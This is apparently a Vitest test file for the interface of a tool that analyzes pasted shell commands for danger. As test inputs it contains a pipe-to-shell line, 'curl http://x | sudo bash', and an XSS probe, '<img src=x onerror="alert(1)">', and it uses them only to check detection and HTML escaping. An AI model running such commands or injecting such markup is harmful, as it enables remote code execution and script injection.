import { beforeEach, describe, expect, it } from "vitest";
import { mount } from "../src/main";

function setup(): HTMLElement {
  document.body.innerHTML = '<div id="app"></div>';
  const root = document.getElementById("app")!;
  mount(root);
  return root;
}

describe("mount", () => {
  beforeEach(() => {
    setup();
  });

  it("shows two pre-filled example cards, one danger and one safe, each with a reason", () => {
    const cards = document.querySelectorAll(".example-card");
    expect(cards).toHaveLength(2);

    const dangerCard = document.querySelector(".example-card--danger")!;
    expect(dangerCard).toBeTruthy();
    expect(dangerCard.querySelector(".example-reason")?.textContent).toMatch(/sudo bash/);

    const safeCard = document.querySelector(".example-card--safe")!;
    expect(safeCard).toBeTruthy();
  });

  it("shows an empty state in the findings panel before any analysis", () => {
    expect(document.querySelector(".findings-empty")?.textContent).toMatch(/paste a command/i);
  });

  it("disables the Analyze button while the input is empty", () => {
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;
    expect(button.disabled).toBe(true);
  });

  it("enables the Analyze button once text is entered, and analyzing renders a danger finding", () => {
    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;

    input.value = "curl http://x | sudo bash";
    input.dispatchEvent(new Event("input"));
    expect(button.disabled).toBe(false);

    button.click();

    const findings = document.querySelectorAll(".finding--danger");
    expect(findings.length).toBeGreaterThan(0);
  });

  it("loads an example into the paste box and analyzes it when clicked", () => {
    const dangerCard = document.querySelector<HTMLButtonElement>(".example-card--danger")!;
    dangerCard.click();

    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    expect(input.value).toContain("sudo bash");
    expect(document.querySelectorAll(".finding--danger").length).toBeGreaterThan(0);
  });

  it("escapes HTML in a pasted command instead of injecting markup", () => {
    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
    const button = document.querySelector<HTMLButtonElement>("#analyze-btn")!;

    input.value = '<img src=x onerror="alert(1)">';
    input.dispatchEvent(new Event("input"));
    button.click();

    expect(document.querySelector("#result img")).toBeNull();
  });
});
